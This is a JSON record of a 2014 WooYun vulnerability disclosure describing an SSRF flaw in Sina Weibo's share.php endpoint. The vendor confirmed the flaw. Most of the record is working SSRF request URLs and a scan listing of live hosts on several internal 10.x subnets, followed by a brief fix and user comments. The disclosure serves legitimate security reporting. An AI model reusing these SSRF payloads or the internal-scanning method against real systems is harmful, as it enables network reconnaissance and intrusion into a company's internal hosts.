{"id": 3131, "wybug_id": "wooyun-2014-061709", "wybug_title": "内网编织者新浪内网急速编织!（内网系统遍历）", "wybug_corp": "新浪", "wybug_author": "Nebula", "wybug_date": "2014-05-21 14:11", "wybug_open_date": "2014-07-05 14:11", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "12", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计缺陷", "设计不当", "内网编织"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-05-21：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-05-21：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-05-31：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-06-10：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-06-20：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-07-05：\t细节向公众公开  简要描述： RT! 详细说明：     参照之前小技巧: WooYun: 内网编织者中国搜索引擎内网快速编织   结合小细节把握,一个SSRF漏洞就能很快编织出大型公司内网的结构（如果是一般的小应用它算不上漏洞，但对于有大型网络结构的应用就不一样了，这是个标志性的漏洞，因为能直接撕开网络边界，看似很小，但效果很好。危害不仅限于http协议（也不仅限于这类场景功能的实现缺陷，其他漏洞也可以去构造SSRF），可能会引领以后的web漏洞新潮流）.   这里是分享功能实现缺陷,允许访问当前应用所在的内网.   快速验证漏洞,访问当前服务器：   http://service.weibo.com/share/share.php?url=http://127.0.0.1:80 \n\n    漏洞证明：    结合小细节化的工具就能批量了（随便找了几个存活的网段，扫描80，8080端口的应用）： \n\n \n10.67.15.*80:find: http://service.weibo.com/share/share.php?url=http://10.67.15.10:80find: http://service.weibo.com/share/share.php?url=http://10.67.15.11:80find: http://service.weibo.com/share/share.php?url=http://10.67.15.12:80find: http://service.weibo.com/share/share.php?url=http://10.67.15.13:80find: http://service.weibo.com/share/share.php?url=http://10.67.15.18:80find: http://service.weibo.com/share/share.php?url=http://10.67.15.19:80find: http://service.weibo.com/share/share.php?url=http://10.67.15.22:80find: http://service.weibo.com/share/share.php?url=http://10.67.15.23:80find: http://service.weibo.com/share/share.php?url=http://10.67.15.24:80find: http://service.weibo.com/share/share.php?url=http://10.67.15.25:80find: http://service.weibo.com/share/share.php?url=http://10.67.15.26:80find: http://service.weibo.com/share/share.php?url=http://10.67.15.27:80find: http://service.weibo.com/share/share.php?url=http://10.67.15.28:80find: http://service.weibo.com/share/share.php?url=http://10.67.15.29:80find: http://service.weibo.com/share/share.php?url=http://10.67.15.31:80find: http://service.weibo.com/share/share.php?url=http://10.67.15.32:80find: http://service.weibo.com/share/share.php?url=http://10.67.15.33:80find: http://service.weibo.com/share/share.php?url=http://10.67.15.35:80find: http://service.weibo.com/share/share.php?url=http://10.67.15.37:80find: http://service.weibo.com/share/share.php?url=http://10.67.15.38:80find: http://service.weibo.com/share/share.php?url=http://10.67.15.39:80find: http://service.weibo.com/share/share.php?url=http://10.67.15.42:80find: http://service.weibo.com/share/share.php?url=http://10.67.15.43:80find: http://service.weibo.com/share/share.php?url=http://10.67.15.47:80find: http://service.weibo.com/share/share.php?url=http://10.67.15.65:80find: http://service.weibo.com/share/share.php?url=http://10.67.15.66:80find: http://service.weibo.com/share/share.php?url=http://10.67.15.67:80find: http://service.weibo.com/share/share.php?url=http://10.67.15.68:80find: http://service.weibo.com/share/share.php?url=http://10.67.15.69:80find: http://service.weibo.com/share/share.php?url=http://10.67.15.88:80find: http://service.weibo.com/share/share.php?url=http://10.67.15.89:80find: http://service.weibo.com/share/share.php?url=http://10.67.15.90:80find: http://service.weibo.com/share/share.php?url=http://10.67.15.96:80find: http://service.weibo.com/share/share.php?url=http://10.67.15.98:80find: http://service.weibo.com/share/share.php?url=http://10.67.15.105:80find: http://service.weibo.com/share/share.php?url=http://10.67.15.110:80find: http://service.weibo.com/share/share.php?url=http://10.67.15.117:80find: http://service.weibo.com/share/share.php?url=http://10.67.15.136:80find: http://service.weibo.com/share/share.php?url=http://10.67.15.138:80find: http://service.weibo.com/share/share.php?url=http://10.67.15.139:80find: http://service.weibo.com/share/share.php?url=http://10.67.15.140:80find: http://service.weibo.com/share/share.php?url=http://10.67.15.141:80find: http://service.weibo.com/share/share.php?url=http://10.67.15.142:80find: http://service.weibo.com/share/share.php?url=http://10.67.15.145:80find: http://service.weibo.com/share/share.php?url=http://10.67.15.154:80find: http://service.weibo.com/share/share.php?url=http://10.67.15.155:80find: http://service.weibo.com/share/share.php?url=http://10.67.15.156:80find: http://service.weibo.com/share/share.php?url=http://10.67.15.171:80find: http://service.weibo.com/share/share.php?url=http://10.67.15.172:80find: http://service.weibo.com/share/share.php?url=http://10.67.15.177:80find: http://service.weibo.com/share/share.php?url=http://10.67.15.180:80find: http://service.weibo.com/share/share.php?url=http://10.67.15.187:80find: http://service.weibo.com/share/share.php?url=http://10.67.15.189:80find: http://service.weibo.com/share/share.php?url=http://10.67.15.195:80find: http://service.weibo.com/share/share.php?url=http://10.67.15.196:80find: http://service.weibo.com/share/share.php?url=http://10.67.15.198:80find: http://service.weibo.com/share/share.php?url=http://10.67.15.199:80find: http://service.weibo.com/share/share.php?url=http://10.67.15.204:80find: http://service.weibo.com/share/share.php?url=http://10.67.15.214:80find: http://service.weibo.com/share/share.php?url=http://10.67.15.216:80find: http://service.weibo.com/share/share.php?url=http://10.67.15.217:80find: http://service.weibo.com/share/share.php?url=http://10.67.15.222:80find: http://service.weibo.com/share/share.php?url=http://10.67.15.227:80find: http://service.weibo.com/share/share.php?url=http://10.67.15.244:80find: http://service.weibo.com/share/share.php?url=http://10.67.15.245:80find: http://service.weibo.com/share/share.php?url=http://10.67.15.254:808080:find: http://service.weibo.com/share/share.php?url=http://10.67.15.10:8080find: http://service.weibo.com/share/share.php?url=http://10.67.15.11:8080find: http://service.weibo.com/share/share.php?url=http://10.67.15.12:8080find: http://service.weibo.com/share/share.php?url=http://10.67.15.13:8080find: http://service.weibo.com/share/share.php?url=http://10.67.15.63:8080find: http://service.weibo.com/share/share.php?url=http://10.67.15.64:8080find: http://service.weibo.com/share/share.php?url=http://10.67.15.195:8080find: http://service.weibo.com/share/share.php?url=http://10.67.15.214:808010.29.10.*80:find: http://service.weibo.com/share/share.php?url=http://10.29.10.11:80find: http://service.weibo.com/share/share.php?url=http://10.29.10.33:80find: http://service.weibo.com/share/share.php?url=http://10.29.10.35:80find: http://service.weibo.com/share/share.php?url=http://10.29.10.37:80find: http://service.weibo.com/share/share.php?url=http://10.29.10.38:80find: http://service.weibo.com/share/share.php?url=http://10.29.10.41:80find: http://service.weibo.com/share/share.php?url=http://10.29.10.42:80find: http://service.weibo.com/share/share.php?url=http://10.29.10.43:80find: http://service.weibo.com/share/share.php?url=http://10.29.10.44:80find: http://service.weibo.com/share/share.php?url=http://10.29.10.45:80find: http://service.weibo.com/share/share.php?url=http://10.29.10.47:80find: http://service.weibo.com/share/share.php?url=http://10.29.10.49:80find: http://service.weibo.com/share/share.php?url=http://10.29.10.51:80find: http://service.weibo.com/share/share.php?url=http://10.29.10.72:80find: http://service.weibo.com/share/share.php?url=http://10.29.10.76:80find: http://service.weibo.com/share/share.php?url=http://10.29.10.78:80find: http://service.weibo.com/share/share.php?url=http://10.29.10.86:80find: http://service.weibo.com/share/share.php?url=http://10.29.10.100:80find: http://service.weibo.com/share/share.php?url=http://10.29.10.101:80find: http://service.weibo.com/share/share.php?url=http://10.29.10.115:80find: http://service.weibo.com/share/share.php?url=http://10.29.10.121:80find: http://service.weibo.com/share/share.php?url=http://10.29.10.122:80find: http://service.weibo.com/share/share.php?url=http://10.29.10.123:80find: http://service.weibo.com/share/share.php?url=http://10.29.10.124:80find: http://service.weibo.com/share/share.php?url=http://10.29.10.125:80find: http://service.weibo.com/share/share.php?url=http://10.29.10.131:80find: http://service.weibo.com/share/share.php?url=http://10.29.10.133:80find: http://service.weibo.com/share/share.php?url=http://10.29.10.137:80find: http://service.weibo.com/share/share.php?url=http://10.29.10.145:80find: http://service.weibo.com/share/share.php?url=http://10.29.10.154:80find: http://service.weibo.com/share/share.php?url=http://10.29.10.156:80find: http://service.weibo.com/share/share.php?url=http://10.29.10.157:80find: http://service.weibo.com/share/share.php?url=http://10.29.10.171:80find: http://service.weibo.com/share/share.php?url=http://10.29.10.179:80find: http://service.weibo.com/share/share.php?url=http://10.29.10.183:80find: http://service.weibo.com/share/share.php?url=http://10.29.10.184:80find: http://service.weibo.com/share/share.php?url=http://10.29.10.189:80find: http://service.weibo.com/share/share.php?url=http://10.29.10.190:80find: http://service.weibo.com/share/share.php?url=http://10.29.10.193:80find: http://service.weibo.com/share/share.php?url=http://10.29.10.196:80find: http://service.weibo.com/share/share.php?url=http://10.29.10.200:80find: http://service.weibo.com/share/share.php?url=http://10.29.10.201:80find: http://service.weibo.com/share/share.php?url=http://10.29.10.206:80find: http://service.weibo.com/share/share.php?url=http://10.29.10.208:80find: http://service.weibo.com/share/share.php?url=http://10.29.10.209:80find: http://service.weibo.com/share/share.php?url=http://10.29.10.210:80find: http://service.weibo.com/share/share.php?url=http://10.29.10.211:80find: http://service.weibo.com/share/share.php?url=http://10.29.10.212:80find: http://service.weibo.com/share/share.php?url=http://10.29.10.215:80find: http://service.weibo.com/share/share.php?url=http://10.29.10.216:80find: http://service.weibo.com/share/share.php?url=http://10.29.10.217:80find: http://service.weibo.com/share/share.php?url=http://10.29.10.218:80find: http://service.weibo.com/share/share.php?url=http://10.29.10.219:80find: http://service.weibo.com/share/share.php?url=http://10.29.10.221:80find: http://service.weibo.com/share/share.php?url=http://10.29.10.222:80find: http://service.weibo.com/share/share.php?url=http://10.29.10.223:80find: http://service.weibo.com/share/share.php?url=http://10.29.10.224:80find: http://service.weibo.com/share/share.php?url=http://10.29.10.234:80find: http://service.weibo.com/share/share.php?url=http://10.29.10.251:80find: http://service.weibo.com/share/share.php?url=http://10.29.10.252:808080:find: http://service.weibo.com/share/share.php?url=http://10.29.10.40:8080find: http://service.weibo.com/share/share.php?url=http://10.29.10.204:808010.55.22.*80:find: http://service.weibo.com/share/share.php?url=http://10.55.22.36:80find: http://service.weibo.com/share/share.php?url=http://10.55.22.37:80find: http://service.weibo.com/share/share.php?url=http://10.55.22.38:80find: http://service.weibo.com/share/share.php?url=http://10.55.22.43:80find: http://service.weibo.com/share/share.php?url=http://10.55.22.44:80find: http://service.weibo.com/share/share.php?url=http://10.55.22.45:80find: http://service.weibo.com/share/share.php?url=http://10.55.22.61:80find: http://service.weibo.com/share/share.php?url=http://10.55.22.68:80find: http://service.weibo.com/share/share.php?url=http://10.55.22.76:80find: http://service.weibo.com/share/share.php?url=http://10.55.22.91:80find: http://service.weibo.com/share/share.php?url=http://10.55.22.92:80find: http://service.weibo.com/share/share.php?url=http://10.55.22.102:80find: http://service.weibo.com/share/share.php?url=http://10.55.22.104:80find: http://service.weibo.com/share/share.php?url=http://10.55.22.106:80find: http://service.weibo.com/share/share.php?url=http://10.55.22.109:80find: http://service.weibo.com/share/share.php?url=http://10.55.22.114:80find: http://service.weibo.com/share/share.php?url=http://10.55.22.116:80find: http://service.weibo.com/share/share.php?url=http://10.55.22.117:80find: http://service.weibo.com/share/share.php?url=http://10.55.22.124:80find: http://service.weibo.com/share/share.php?url=http://10.55.22.126:80find: http://service.weibo.com/share/share.php?url=http://10.55.22.130:80find: http://service.weibo.com/share/share.php?url=http://10.55.22.131:80find: http://service.weibo.com/share/share.php?url=http://10.55.22.144:80find: http://service.weibo.com/share/share.php?url=http://10.55.22.145:80find: http://service.weibo.com/share/share.php?url=http://10.55.22.146:80find: http://service.weibo.com/share/share.php?url=http://10.55.22.147:80find: http://service.weibo.com/share/share.php?url=http://10.55.22.155:80find: http://service.weibo.com/share/share.php?url=http://10.55.22.159:80find: http://service.weibo.com/share/share.php?url=http://10.55.22.162:80find: http://service.weibo.com/share/share.php?url=http://10.55.22.163:80find: http://service.weibo.com/share/share.php?url=http://10.55.22.173:80find: http://service.weibo.com/share/share.php?url=http://10.55.22.176:80find: http://service.weibo.com/share/share.php?url=http://10.55.22.177:80find: http://service.weibo.com/share/share.php?url=http://10.55.22.180:80find: http://service.weibo.com/share/share.php?url=http://10.55.22.182:80find: http://service.weibo.com/share/share.php?url=http://10.55.22.185:80find: http://service.weibo.com/share/share.php?url=http://10.55.22.186:80find: http://service.weibo.com/share/share.php?url=http://10.55.22.187:80find: http://service.weibo.com/share/share.php?url=http://10.55.22.188:80find: http://service.weibo.com/share/share.php?url=http://10.55.22.191:80find: http://service.weibo.com/share/share.php?url=http://10.55.22.192:80find: http://service.weibo.com/share/share.php?url=http://10.55.22.203:80find: http://service.weibo.com/share/share.php?url=http://10.55.22.205:80find: http://service.weibo.com/share/share.php?url=http://10.55.22.208:80find: http://service.weibo.com/share/share.php?url=http://10.55.22.215:80find: http://service.weibo.com/share/share.php?url=http://10.55.22.221:80find: http://service.weibo.com/share/share.php?url=http://10.55.22.224:80find: http://service.weibo.com/share/share.php?url=http://10.55.22.225:80find: http://service.weibo.com/share/share.php?url=http://10.55.22.241:80find: http://service.weibo.com/share/share.php?url=http://10.55.22.250:808080:find: http://service.weibo.com/share/share.php?url=http://10.55.22.108:8080find: http://service.weibo.com/share/share.php?url=http://10.55.22.135:8080find: http://service.weibo.com/share/share.php?url=http://10.55.22.138:8080find: http://service.weibo.com/share/share.php?url=http://10.55.22.141:8080find: http://service.weibo.com/share/share.php?url=http://10.55.22.175:8080find: http://service.weibo.com/share/share.php?url=http://10.55.22.181:8080find: http://service.weibo.com/share/share.php?url=http://10.55.22.190:8080find: http://service.weibo.com/share/share.php?url=http://10.55.22.204:8080find: http://service.weibo.com/share/share.php?url=http://10.55.22.206:8080find: http://service.weibo.com/share/share.php?url=http://10.55.22.246:8080find: http://service.weibo.com/share/share.php?url=http://10.55.22.249:808010.210.208.*80:find: http://service.weibo.com/share/share.php?url=http://10.210.208.5:80find: http://service.weibo.com/share/share.php?url=http://10.210.208.34:80find: http://service.weibo.com/share/share.php?url=http://10.210.208.42:80find: http://service.weibo.com/share/share.php?url=http://10.210.208.43:80find: http://service.weibo.com/share/share.php?url=http://10.210.208.45:80find: http://service.weibo.com/share/share.php?url=http://10.210.208.47:80find: http://service.weibo.com/share/share.php?url=http://10.210.208.48:80find: http://service.weibo.com/share/share.php?url=http://10.210.208.49:80find: http://service.weibo.com/share/share.php?url=http://10.210.208.52:80find: http://service.weibo.com/share/share.php?url=http://10.210.208.54:808080:find: http://service.weibo.com/share/share.php?url=http://10.210.208.36:8080find: http://service.weibo.com/share/share.php?url=http://10.210.208.47:8080find: http://service.weibo.com/share/share.php?url=http://10.210.208.49:808010.67.24.*80:find: http://service.weibo.com/share/share.php?url=http://10.67.24.30:80\n   内网结构，一目了然！ \n\n \n\n\n\n\n\n\n\n\n\n   修复方案：  限制内网请求！   版权声明：转载请注明来源 Nebula@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2014-05-21 16:57 厂商回复： 感谢关注新浪安全，麻烦通知相应的工作人员 进行处理 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-05-21 14:14 |    \t\t承诺 \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:2        | 你关注的漏洞 发表了白帽子)\t\t \n  碉堡    \n     2014-05-21 14:50 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  编织 这个词儿用的好诡异     \n     2014-05-21 16:15 |    \t\t孤独雪狼 \t\t\t( 普通白帽子  |\t\t\t        Rank:710 漏洞数:145        | 七夕手机被偷，这坑爹的七夕啊 。。。。)\t\t \n  期待下    \n     2014-05-22 12:00 |    \t\t只发通用型 \t\t\t( 实习白帽子  |\t\t\t        Rank:93 漏洞数:14        | 刷通用型奖金小号)\t\t \n  DOTAER？    \n     2014-07-05 14:22 |    \t\tF4K3R \t\t\t( 普通白帽子  |\t\t\t        Rank:297 漏洞数:31        | 学习)\t\t \n  SSRF批量的思路 赞！    \n     2014-07-05 16:58 |    \t\tzzR  \t\t\t( 核心白帽子 |\t\t\t        Rank:1382 漏洞数:122        | 收wb   1：5 无限量收   [平台担保])\t\t \n  mark 一下，近期碰到这么个案例    \n     2014-07-05 22:34 |    \t\tnoob \t\t\t( 实习白帽子  |\t\t\t        Rank:81 漏洞数:18        | 向各位大神学习，向各位大神致敬)\t\t \n  mark 新漏洞应用    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}